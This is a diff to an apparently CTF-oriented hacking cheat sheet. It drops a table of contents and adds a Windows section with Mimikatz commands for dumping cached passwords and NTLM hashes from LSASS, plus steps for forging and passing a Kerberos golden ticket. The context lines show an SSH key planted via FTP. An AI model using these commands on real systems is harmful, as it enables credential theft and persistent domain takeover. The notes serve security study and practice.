@@ -11,55 +11,6 @@
 
 <!-- toc -->
 
-- [System Hacking](#system-hacking)
-  - [Nmap Scanning](#nmap-scanning)
-  - [Netdiscover Scanning](#netdiscover-scanning)
-  - [Nikto Scanning](#nikto-scanning)
-  - [WebServer is Open](#webserver-is-open)
-  - [Directory Bursting](#directory-bursting)
-  - [Generating Wordlist from the Website](#generating-wordlist-from-the-website)
-  - [SMB is Open](#smb-is-open)
-  - [To Extract and Mount VHD Drive Files](#to-extract-and-mount-vhd-drive-files)
-  - [To search for Exploits on Metasploit by Name](#to-search-for-exploits-on-metasploit-by-name)
-  - [Wordpress Open](#wordpress-open)
-  - [RPC Open](#rpc-open)
-  - [Powershell](#powershell)
-  - [NOSql Code Injection](#nosql-code-injection)
-- [Web Hacking](#web-hacking)
-  - [Five Stages of Web Hacking](#five-stages-of-web-hacking)
-  - [Enumeration and Reconnaissance Tools](#enumeration-and-reconnaissance-tools)
-  - [Scanning](#scanning)
-  - [Payloads](#payloads)
-  - [Shells](#shells)
-  - [BufferOverflow](#bufferoverflow)
-  - [Gobuster](#gobuster)
-  - [SQLMAP](#sqlmap)
-- [File Hacking](#file-hacking)
-  - [Extract hidden text from PDF Files](#extract-hidden-text-from-pdf-files)
-  - [Compress File Extraction](#compress-file-extraction)
-  - [Extract hidden strings](#extract-hidden-strings)
-- [Cryptography](#cryptography)
-  - [Caesar Cipher](#caesar-cipher)
-  - [Vigenere Cipher](#vigenere-cipher)
-  - [One Time Pad Cipher](#one-time-pad-cipher)
-- [Forensics](#forensics)
-  - [Image File](#image-file)
-  - [Binwalk](#binwalk)
-  - [Extract NTFS Filesystem](#extract-ntfs-filesystem)
-  - [Recover Files from Deleted File Systems](#recover-files-from-deleted-file-systems)
-  - [Packet Capture](#packet-capture)
-  - [JavaScript Deobfuscator](#javascript-deobfuscator)
-- [Password Cracking](#password-cracking)
-  - [JOHN the ripper](#john-the-ripper)
-  - [SAM Hashes](#sam-hashes)
-  - [Linux User Hashes](#linux-user-hashes)
-  - [Hashcat](#hashcat)
-  - [7z Password Cracking](#7z-password-cracking)
-  - [SSH Password Cracking](#ssh-password-cracking)
-- [Privilige Escalation](#privilige-escalation)
-  - [Standard Scripts for Enumeration](#standard-scripts-for-enumeration)
-  - [Reconnoitre](#reconnoitre)
-
 <!-- tocstop -->
 
 ## System Hacking 
@@ -960,7 +911,29 @@ Using binary mode to transfer files.
 ftp> put id_rsa.pub
 ftp> rename id_rsa.pub authorized_keys
 ```
+#### Windows Hacking
 
+### Mimikatz 
+Platform used for debug privilege, hash dumps, process manipulation, impersonation, and more
+
+Debug Privilege: access to LSASS: Local Security Authority Subsystem Service -> access tokens are managed by LSASS
+#### LSASS
+1. Attempt to dump cached passwords using ```sekurlsa::logonpasswords```
+2. May need to use ```token::elevate``` for preivilege escalation
+3. ```lsadump::sam``` -> this command should give the LM/NTLM hashes (depends on version of Windows)
+#### Making Golden Tickets with Kerberos
+1. Get the security id via ```> $ whoami /user```
+2. Use kerberos module to get a krbtgt hash ```kerberos::hash```
+3. With RC4/AES, forge a ticket (may need username - Admin is common, domain is common)
+4. Manufacturing ticket:
+5. ```kerberos::golden /admin:Administrator /domain:f4rmc0rp.com
+/sid:S-1-1-12-123456789-1234567890-123456789
+/krbtgt:deadbeefcafeface003133700009999
+/ticket:Administrator.tkt``` Note: may need tyo specify group accesses to be enabled if Admin does not have access to some groups
+6. Execute the ticket by passing the ticket: ```kerberos::ptt```
+###
+
+###
 ### Reconnoitre
 Security tool for multithreaded information gathering and service enumeration whilst building directory structures to store results, along with writing out recommendations for further testing.
 - [Link](https://github.com/codingo/Reconnoitre)
